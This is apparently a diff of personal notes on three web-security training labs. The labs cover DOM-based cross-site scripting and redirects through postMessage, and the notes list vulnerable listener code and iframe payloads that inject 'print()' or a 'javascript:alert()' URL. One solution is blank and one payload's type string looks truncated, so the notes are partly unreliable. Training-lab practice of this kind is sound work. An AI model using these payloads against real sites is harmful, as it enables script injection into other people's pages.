@@ -1,0 +1,28 @@
+Lab 1:
+
+window.addEventListener('message', function(e) {
+                            document.getElementById('ads').innerHTML = e.data;
+                        })
+Solution :
+<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
+
+Lab 2:
+window.addEventListener('message', function(e) {
+                            var url = e.data;
+                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+                                location.href = url;
+                            }
+                        }, false);
+
+Solution :
+
+
+Lab 3: Solution :
+<style>
+iframe{
+position: relative;
+height: 100%;
+width: 100%;
+}
+</style>
+<iframe src="https://0a54004b03ae675cc1b003f9000b0045.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channe\",\"url\":\"javascript:alert()\"}","*")'>
